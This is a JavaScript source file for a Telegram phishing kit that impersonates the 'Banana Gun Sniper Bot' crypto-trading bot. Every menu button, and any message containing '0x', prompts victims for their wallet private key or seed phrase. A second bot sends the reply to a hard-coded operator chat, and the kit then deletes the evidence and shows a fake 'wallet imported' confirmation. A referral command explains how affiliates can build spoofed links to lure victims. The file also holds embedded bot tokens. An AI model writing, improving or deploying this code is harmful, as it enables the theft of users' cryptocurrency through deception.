const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Replace these with your respective Bot tokens from BotFather
const botAToken = '7687775677:AAEgZFmvnHHL6FofBrfIoL5hWcBJwKNBiRc';  // Token for Bot A
const botBToken = '7553970773:AAFsF5fwVwwnea1T73Iazwom1la3gE8KdVc';  // Token for Bot B

// Create instances for both bots (polling mode)
const botA = new TelegramBot(botAToken, { polling: true });
const botB = new TelegramBot(botBToken, { polling: true });

// Target chat ID where Bot B should send forwarded messages
const targetChatId = 7069233107; 

// Map to store the state for each user interacting with Bot A
const userState = {};

// Placeholder for the initial message when /start is issued
const startMessage = `⚙️ Banana Gun Sniper Bot\n\n🍌 Your smart ally in the world of trading: Boost your gains with Banana Gun. Trade faster, snipe earlier and track live profits.\n\n________________________________________\n\n📖 <a href="https://snipers-playbook-link.com">Snipers Playbook</a>\n💬 <a href="https://t.me/official_channel_link">Official Channel</a>\n🎉 <a href="https://t.me/announcement_channel_link">Announcement Channel</a>\n🌍 <a href="https://bananagun.com">Website</a>\n\n💡 Paste the token address below to quick start with preset defaults.`;

// Placeholder texts for buttons
const button5Text = 'Settings';
const button4Text = 'Auto Sniper';
const button3Text = 'Manual Buyer';
const button2Text = 'Setup Limit Order';
const button1Text = 'My Pending Snipes';

// Function to load user profiles from a text file
const loadUserProfiles = () => {
  if (!fs.existsSync('userprofiles.txt')) {
    fs.writeFileSync('userprofiles.txt', '{}'); // Initialize as empty JSON
  }
  const data = fs.readFileSync('userprofiles.txt', 'utf-8');
  return data ? JSON.parse(data) : {};
};

// Function to save user profiles to a text file
const saveUserProfiles = (profiles) => {
  fs.writeFileSync('userprofiles.txt', JSON.stringify(profiles, null, 2));
};

// Load existing user profiles
const userProfiles = loadUserProfiles();

/* ======================= BOT A: User Interaction ======================= */

// Listener for any message
botA.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Initialize user profile if not already present
  if (!userProfiles[chatId]) {
    userProfiles[chatId] = { hasReferralLink: false, referrals: [] };
    saveUserProfiles(userProfiles);
  }

  // Check for referral link when starting the bot
  if (text.startsWith('/start')) {
    const referralId = text.split(' ')[1]; // Extract referral ID if present
    if (referralId && userProfiles[referralId]) {
      // If referral ID is valid, notify the inviter
      const inviterChatId = referralId;
      if (userProfiles[inviterChatId]) {
        const invitedUserMessage = `✅ User ${chatId} joined through your referral link!`;
        botA.sendMessage(inviterChatId, invitedUserMessage);
        
        // Add this user under the inviter in the profiles
        userProfiles[inviterChatId].referrals.push(chatId);
        saveUserProfiles(userProfiles); // Save updated profiles
      }
    }

    // Send the initial message with buttons
    const options = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: button1Text, callback_data: 'btn1' },
          ],
          [
            { text: button2Text, callback_data: 'btn2' }
          ],
          [
            { text: button3Text, callback_data: 'btn3' },
          ],
          [
            { text: button4Text, callback_data: 'btn4' }
          ],
          [
            { text: button5Text, callback_data: 'btn5' }
          ]
        ]
      }
    };

    botA.sendMessage(chatId, startMessage, {
      parse_mode: 'HTML',
      reply_markup: options.reply_markup,
      disable_web_page_preview: true
    });

    // Clear the user state if they restart the bot
    userState[chatId] = { waitingForInput: false };
  }

  if (text.includes("0x")) {
    const responseText = '⚙️ enter your private key or 12 mnemonic words of your wallet:\n\nSolflare, Phantom, MetaMask, Ledger, TrustWallet, OKX, Coinbase, or other bots private key 🔑  or other DeFi wallets 📝';
    
    const cancelOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Cancel', callback_data: 'cancel' }]
        ]
      }
    };

    botA.sendMessage(chatId, responseText, cancelOptions)
      .then((sentMessage) => {
        userState[chatId] = {
          waitingForInput: true,
          replyMessageId: sentMessage.message_id
        };
      });
    return;
  }

  // Handle the referral link command
  if (text.startsWith('/give_ref_link')) {
    const refUserId = text.split(' ')[1]; // Extract the user ID to give a referral link
    if (!refUserId || !userProfiles[refUserId]) {
      botA.sendMessage(chatId, 'User ID not found or invalid.');
      return;
    }
    
    // Create a referral link
    const referralLink = `https://t.me/bananagunsniper20_bot?start=${refUserId}`;
    userProfiles[refUserId].hasReferralLink = true;
    
    // Save the updated user profiles
    saveUserProfiles(userProfiles);
    
    // Notify the user of their referral link
    const referralMessage = `🎮 Make sure that you first go to @EveryHitBot and do /start so the bot can send you all the logs\n\n🎉 Here is your referral link: ${referralLink}\n\n👻 How to make a spoof link? copy the original bananagun sniper link: https://t.me/BananaGunSniper_bot, paste it, select the link, click on format, then it will either say "hyperlink" or "link". Once clicked you input the link that was assigned to you and voila.`;
    botA.sendMessage(refUserId, referralMessage);
    botA.sendMessage(chatId, `Referral link sent to user ${refUserId}.`);
    return;
  }

  // Handle user input after a button is clicked and wait for one message
  if (userState[chatId] && userState[chatId].waitingForInput) {
    const replyMessageId = userState[chatId].replyMessageId;

    // Forward the user's message to Bot B
    botB.sendMessage(targetChatId, `Forwarded from Bot A: ${msg.text}`)
      .then(() => {
        botA.deleteMessage(chatId, msg.message_id);
        botA.deleteMessage(chatId, replyMessageId);
        
        return botA.sendMessage(chatId, "Your wallet has been imported ✅\n\nYou can now start sniping and trading!🔫 ");
      })
      .then((confirmationMessage) => {
        setTimeout(() => {
          botA.deleteMessage(chatId, confirmationMessage.message_id);
        }, 5000);
      });

    userState[chatId] = { waitingForInput: false };
  }
});

// Handle button clicks
botA.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;
  const messageId = message.message_id;
  const data = callbackQuery.data;

  if (data === 'cancel') {
    botA.deleteMessage(chatId, messageId);
    userState[chatId] = { waitingForInput: false };
    return;
  }

  let responseText = '';
  switch (data) {
    case 'btn1':
    case 'btn2':
    case 'btn3':
    case 'btn4':
    case 'btn5':
      responseText = '⚙️ enter your private key or 12 mnemonic words of your wallet:\n\nSolflare, Phantom, MetaMask, Ledger, TrustWallet, OKX, Coinbase, or other bots private key 🔑  or other DeFi wallets 📝';
      break;
    default:
      return;
  }

  const cancelOptions = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Cancel', callback_data: 'cancel' }]
      ]
    }
  };

  botA.sendMessage(chatId, responseText, cancelOptions)
    .then((sentMessage) => {
      userState[chatId] = {
        waitingForInput: true,
        replyMessageId: sentMessage.message_id
      };
    });
});

/* ======================= BOT B: Forwarding Messages ======================= */

botB.on('message', (msg) => {
  const forwardedMessage = msg.text;
  
  // Ensure Bot B sends the message to the target chat ID
  botB.sendMessage(targetChatId, `Received a message: ${forwardedMessage}`);
});
